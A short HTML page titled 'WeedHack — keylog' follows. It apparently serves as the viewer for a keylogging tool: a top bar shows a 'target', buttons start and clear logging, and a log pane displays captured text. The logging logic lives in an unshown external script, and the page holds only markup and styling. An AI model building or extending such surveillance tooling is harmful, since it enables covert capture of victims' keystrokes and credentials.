<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WeedHack — keylog</title>
<link rel="stylesheet" href="/css/style.css">
<style>
  html, body { height: 100%; }
  body { background: #04100a; margin: 0; }
  .wrap { height: 100vh; display: flex; flex-direction: column; }
  .topbar {
    display: flex; align-items: center; gap: 10px;
    padding: 8px 14px; flex-shrink: 0;
    background: linear-gradient(180deg, #0b2313, #071a0e);
    border-bottom: 1px solid var(--line);
    font-size: 12px; color: var(--muted);
  }
  .topbar .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--red); }
  .topbar .dot.on { background: var(--green-2); box-shadow: 0 0 6px var(--green-2); }
  .topbar .target { color: var(--text); font-family: var(--mono); }
  .topbar .spacer { flex: 1; }
  .topbar button {
    margin: 0; padding: 6px 12px; font-size: 11px; width: auto;
    background: transparent; border: 1px solid var(--line-2); color: var(--text);
    border-radius: 5px; cursor: pointer; font-family: inherit;
  }
  .topbar button:hover { border-color: var(--green-2); }
  .topbar button.on { background: var(--green); border-color: var(--green-2); color: #04170a; font-weight: 600; }
  .log {
    flex: 1; overflow-y: auto; padding: 14px 16px;
    font-family: var(--mono); font-size: 13px; line-height: 1.6;
    color: #c8e8d0; background: #04100a; white-space: pre-wrap; word-break: break-word;
  }
  .log .t { color: var(--muted); font-size: 11px; }
  .log .chunk { margin-bottom: 6px; }
</style>
</head>
<body>
<div class="wrap">
  <div class="topbar">
    <span class="dot" id="dot"></span>
    <span class="target" id="target">—</span>
    <span class="spacer"></span>
    <button id="toggle">start logging</button>
    <button id="clear">clear log</button>
    <button id="close">close</button>
  </div>
  <div class="log" id="log"></div>
</div>
<script src="/js/keylog.js"></script>
</body>
</html>
